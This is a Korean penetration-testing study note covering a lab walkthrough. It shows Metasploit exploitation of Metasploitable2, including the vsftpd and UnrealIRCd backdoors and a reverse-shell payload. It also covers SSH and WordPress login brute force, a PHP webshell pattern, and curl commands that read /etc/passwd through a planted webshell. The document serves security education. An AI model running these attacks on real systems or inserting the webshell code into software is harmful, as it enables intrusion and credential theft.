# 모의해킹 학습 정리 (Metasploit / Web Hacking)

> 교육 목적의 취약점 진단 및 공격 기법 학습 기록
> 대상: Metasploitable2 (의도적으로 취약하게 설계된 학습용 VM), WordPress 실습 환경

---

## ⚠️ 사용 목적 안내

이 문서에 정리된 모든 명령어와 공격 기법은 **자신이 소유했거나 명시적으로 테스트 허가를 받은 시스템**(Metasploitable2, 사설 랩 환경 등)에서만 사용해야 합니다. 무단으로 타인의 시스템에 사용할 경우 법적 책임이 따를 수 있습니다.

---

## 📋 목차

1. [Metasploitable2 취약점 진단 실습](#1-metasploitable2-취약점-진단-실습)
2. [GraphQL 보안](#2-graphql-보안)
3. [WordPress 취약점 진단](#3-wordpress-취약점-진단)
4. [PHP 웹셸과 원격 코드 실행](#4-php-웹셸과-원격-코드-실행)
5. [전체 공격 흐름 요약](#5-전체-공격-흐름-요약)
6. [참고 자료](#참고-자료)

---

## 1. Metasploitable2 취약점 진단 실습

### 1-1. Metasploit 환경 준비

```bash
msfdb -h        # msfdb 명령어 도움말 확인
msfdb status    # 데이터베이스 연동 상태 확인
msfdb init      # 최초 1회, DB 초기화 (스캔 결과 저장용)
```

**왜 쓰는가?**
Metasploit은 PostgreSQL DB와 연동해서 스캔 결과, 세션 정보, 호스트 목록 등을 저장합니다. `msfdb init`을 미리 해두면 `hosts`, `services` 같은 명령어로 스캔 이력을 조회할 수 있습니다.

### 1-2. 전체 포트 스캔

```bash
nmap -sC -sV -Pn -p- 172.16.11.221
```

| 옵션 | 의미 |
|---|---|
| `-sC` | 기본 NSE 스크립트 실행 (서비스별 기본 정보 수집) |
| `-sV` | 서비스/버전 탐지 |
| `-Pn` | Ping 스캔 생략 (방화벽이 ICMP를 막아도 스캔 진행) |
| `-p-` | 전체 65535 포트 스캔 |

---

### 1-3. vsftpd 2.3.4 백도어 취약점 (포트 21)

**배경**
vsftpd 2.3.4 버전은 특정 시점에 소스코드가 변조되어 배포된 적이 있고, 로그인 아이디에 `:)` 스마일리를 포함해 접속하면 **6200번 포트에 백도어 셸이 열리는** 유명한 취약점입니다.

```bash
search vsftpd
show options
set LHOST 172.16.11.216
set FETCH_SRVHOST 172.16.11.216
run
```

**참고 — show options에 계정 정보가 안 보이는 이유**
`vsftpd_234_backdoor` 모듈은 트리거용 아이디/비번이 모듈 내부 코드에 이미 하드코딩되어 있어서, 별도로 `set USERNAME` 등을 지정할 필요가 없습니다. 그래서 옵션 목록에도 안 나타납니다.

**익명 FTP 로그인 확인**
```bash
sudo ftp 172.16.11.221
# Name: anonymous
# Password: (그냥 Enter)
# → 230 Login successful.
```

---

### 1-4. WebDAV를 통한 웹셸 업로드 (포트 80)

```bash
nmap -sC -sV -A -p 80 172.16.11.221
search webdav
```

**WebDAV란?**
HTTP 프로토콜 위에서 파일 업로드/수정/삭제를 가능하게 해주는 확장 표준. 서버에 권한 설정 오류가 있으면(예: 인증 없이 누구나 업로드 가능) 공격자가 웹셸을 바로 업로드할 수 있습니다.

**cadaver로 WebDAV 접속 및 웹셸 업로드**
```bash
sudo cadaver http://172.16.11.221/dav/
put cmd.php
```

`cadaver`는 리눅스에서 WebDAV 서버에 FTP처럼 접속해서 파일을 올리고 받을 수 있게 해주는 CLI 도구입니다. 모의해킹 시 "업로드 권한이 뚫려 있는지" 사전 점검용으로 자주 사용됩니다.

```bash
msf > search webdav type:exploit platform:linux
```

---

### 1-5. UnrealIRCd 백도어 (IRC 서비스)

```bash
search unrealircd
set RHOSTS 172.16.11.221
set LHOST 172.16.11.216
set payload cmd/unix/reverse_ruby
exploit
```

**참고 — 메타스플로잇과 루비(Ruby)**
Metasploit Framework 자체가 100% Ruby로 작성되어 있습니다. 페이로드 이름에 `ruby`가 들어간 것도 이 때문이며, 나중에 직접 익스플로잇 모듈을 커스텀하거나 새 취약점을 이식하려면 Ruby 문법을 다뤄야 합니다.

쉘 획득 후 `/etc/unreal` 디렉토리 확인 시 설정 파일, 로그, 모듈 등 다양한 파일이 노출되는 것을 확인할 수 있습니다.

---

### 1-6. Samba / SMB 취약점 (포트 139, 445)

```bash
nmap -sC -sV -A -p 139,445 172.16.11.221
nmap --script smb-enum-shares -p 445 172.16.11.221
smbclient -L 172.16.11.221
smbclient //172.16.11.221/tmp -N
enum4linux -a 172.16.11.221
crackmapexec smb 172.16.11.221
```

**crackmapexec 결과 해석**
- `signing:False` → SMB 패킷 서명이 비활성화됨. 이 경우 네트워크 상에서 인증 정보를 가로채 대리 인증하는 **SMB Relay 공격**에 취약해짐
- `SMBv1:True` → 오래된 SMBv1이 활성화되어 있어 EternalBlue(WannaCry) 같은 강력한 익스플로잇이 통할 가능성이 큼

**계정 크리덴셜 대입**
```bash
crackmapexec smb 172.16.11.221 -u msfadmin -p password.txt
```

**Samba 버전 기반 익스플로잇 검색**
```bash
searchsploit smb 3.0.20-Debian
```
→ CVE-2007-2447 (Samba usermap script) 원격 명령 실행 취약점 확인

---

### 1-7. SSH 크리덴셜 브루트포스

```bash
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /home/red/mfs.txt
set PASS_FILE /home/red/mfspw.txt
set RHOSTS 172.16.11.221
run
```

---

### 1-8. NFS 마운트 취약점 (포트 2049)

```bash
nmap -sC -sV -A -p 2049 172.16.11.221
rpcinfo -p 172.16.11.221
showmount -e 172.16.11.221
```
NFS export 목록에 접근 제한이 없으면, 공격자가 원격에서 임의로 디렉토리를 마운트해 파일을 읽고 쓸 수 있습니다.

---

### 1-9. VNC 취약점

VNC 서버에 인증 없이(또는 약한 비밀번호로) 접속 가능한 경우, 화면을 그대로 공유받아 GUI 세션을 장악하고 루트 권한까지 획득할 수 있습니다.

---

### 1-10. SMTP 사용자 열거 (포트 25)

```bash
nc -vn 172.16.11.221 25
HELO 172.16.11.221
VRFY root
# 252 2.0.0 root  ← 계정 존재 확인됨
```
`VRFY` 명령이 활성화되어 있으면 서버에 어떤 계정이 실존하는지 하나씩 확인(계정 열거)할 수 있습니다.

---

## 2. GraphQL 보안

### GraphQL이란?
Facebook(현 Meta)이 개발한 API 쿼리 언어. REST API처럼 URL을 여러 개 두지 않고, **단일 엔드포인트**(`/graphql`)로 원하는 데이터만 정확히 요청하는 방식입니다.

### 장단점

| 장점 | 단점 |
|---|---|
| 단일 엔드포인트로 관리 단순화 | 초기 학습 비용 높음 |
| 프론트/백엔드 독립적 개발 가능 | 캐싱 구현이 복잡함 (URL 하나, Body만 다름) |
| 강력한 타입 시스템으로 문서 자동화 | 쿼리 depth 제한 없으면 서버 과부하 위험 |

### 취약점 — 스키마 정보 노출

```graphql
query {
  schema {
    types {
      names
    }
  }
}

query {
  view {
    no,
    subject,
    content
  }
}
```

**실제 공격 URL 예시**
```
http://webhacking.kr:10012/view.php?query={view{no,subject,content}}
http://webhacking.kr:10012/view.php?query={schema{types{names}}}
```

스키마가 그대로 노출되면 DB 구조 전체를 유추할 수 있고, 원하는 필드만 정밀 조회해 관리자 정보 등 민감 데이터를 뽑아낼 수 있습니다.

**방어 방법**
- 프로덕션 환경에서 GraphiQL(인터랙티브 쿼리 도구) 비활성화
- 스키마 내부 구조 최소 노출
- 쿼리 depth/복잡도 제한 구현

---

## 3. WordPress 취약점 진단

### 왜 WordPress를 노리는가?
전 세계 웹사이트의 약 43%가 WordPress를 사용 중이라, 플러그인/테마발 취약점 하나로 대량의 사이트가 영향을 받을 수 있습니다.

### WPScan — 정보 수집

```bash
wpscan --url 대상사이트 -e p,u
```

| 옵션 | 의미 |
|---|---|
| `-e p,u` | 플러그인(p)과 사용자 계정(u) 열거 |

**수집 가능한 정보**: WordPress/플러그인/테마 버전, 등록된 사용자명, `readme.html` 버전 노출 파일 등

### Hydra — 로그인 브루트포스

```bash
hydra vulnwp http-form-post \
  "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=로그인&redirect_to=...&testcookie=1:비밀번호가 틀립니다." \
  -l admin \
  -P wordpass.txt
```

| 파라미터 | 의미 |
|---|---|
| `^USER^` / `^PASS^` | Hydra가 리스트에서 값을 대입하는 자리 |
| `-l admin` | 고정된 사용자명 하나만 대상 |
| `-P wordpass.txt` | 비밀번호 사전 파일 |
| 마지막 콜론 뒤 문자열 | 로그인 실패 시 뜨는 문구 → 이 문구가 안 뜨면 성공으로 판단 |

**공격 흐름**: WPScan으로 `admin` 계정 확인 → Hydra로 사전 대입 → 로그인 성공 시 비밀번호 확보

---

## 4. PHP 웹셸과 원격 코드 실행 (RCE)

### 웹셸이란?
브라우저 URL 요청만으로 서버에서 임의 명령을 실행할 수 있게 만드는 악성/테스트용 스크립트.

### 취약한 코드 패턴

```php
@extract($_REQUEST);
if (isset($x) && isset($y)) @die($x($y));
```

**왜 위험한가**

1. `extract($_REQUEST)` — GET/POST/COOKIE 파라미터를 통째로 변수로 변환. `?x=system&y=ls` 요청만으로 `$x='system'`, `$y='ls'`가 생성됨
2. `$x($y)` — PHP의 동적 함수 호출 문법. `$x`에 담긴 문자열을 그대로 함수처럼 실행 → `system('ls')`와 동일하게 동작
3. `@die()` — 결과 출력 후 즉시 종료

### 공격 시나리오

1. 취약한 플러그인(예: akismet)에 웹셸 코드 삽입/업로드
2. 파일 경로 접근: `http://vulnwp/wordpress/wp-content/plugins/akismet/akismet.php`
3. 명령어 실행

```bash
# 기본 호출 (정상 동작 확인용)
curl http://vulnwp/wordpress/wp-content/plugins/akismet/akismet.php

# 디렉토리 목록
curl http://vulnwp/.../akismet.php --data "x=passthru&y=ls"

# 시스템 정보 + 계정 목록 조회
curl http://vulnwp/.../akismet.php --data "x=passthru&y=uname -a;cat /etc/passwd"
```

### 대표적인 웹셸 도구 (Kali 기본 제공)

```bash
ls /usr/share/webshells/php
```
| 파일 | 특징 |
|---|---|
| `php-reverse-shell.php` | 공격자 PC로 역방향 접속 (가장 활용도 높음) |
| `simple-backdoor.php` | 기본 명령 실행 |
| `php-backdoor.php` / `qsd-php-backdoor.php` | 특화 기능 제공 |

### RCE 성공 시 공격자가 얻는 것
- 서버 전체 권한 장악
- 패스워드/설정 파일 등 민감 정보 열람
- 내부망 이동(Lateral Movement)의 발판
- 서비스 마비, 데이터 삭제/변조
- 좀비 PC화 (DDoS 등 추가 공격 자원으로 활용)

---

## 5. 전체 공격 흐름 요약

```
1. 정보 수집 (nmap, WPScan)
        ↓
2. 서비스/버전 기반 취약점 매칭 (searchsploit, msf search)
        ↓
3. 초기 접근 (익명 FTP, WebDAV 업로드, 백도어 등)
        ↓
4. 크리덴셜 확보 (Hydra, SSH 브루트포스)
        ↓
5. 웹셸 업로드 / RCE 달성
        ↓
6. 시스템 장악 및 권한 상승
```

### 방어 체크리스트

**관리자 관점**
- [ ] WordPress/플러그인/서비스 최신 버전 유지
- [ ] 강력한 비밀번호 정책 (12자 이상, 특수문자 포함)
- [ ] 기본 계정명(`admin` 등) 변경
- [ ] 로그인 시도 횟수 제한 (브루트포스 방지)
- [ ] 불필요한 파일 쓰기 권한 제거
- [ ] SMBv1 비활성화, SMB 서명 활성화
- [ ] WAF(Web Application Firewall) 도입

**개발자 관점**
- [ ] 모든 사용자 입력 검증
- [ ] Prepared Statement로 SQL 인젝션 방지
- [ ] `extract()`, 동적 함수 호출(`$x($y)`) 등 위험 패턴 금지
- [ ] 업로드 파일 타입/크기/확장자 검증
- [ ] 에러 메시지에 시스템 정보 노출 금지
- [ ] GraphQL 스키마/depth 제한 적용

---

## 참고 자료

- [GraphQL 공식 문서](https://graphql.org/)
- [WordPress 보안 가이드](https://wordpress.org/support/article/hardening-wordpress/)
- [WPScan](https://wpscan.com/)
- [OWASP Top 10](https://owasp.org/Top10/)
- [Metasploit Framework Docs](https://docs.metasploit.com/)

---

## ⚠️ 법적 고지

이 문서는 **교육 및 인가된 보안 테스트 목적**으로만 작성되었습니다. 자신이 소유했거나 명시적 허가를 받은 시스템 외에는 적용하지 마세요. 무단 접근은 불법입니다.
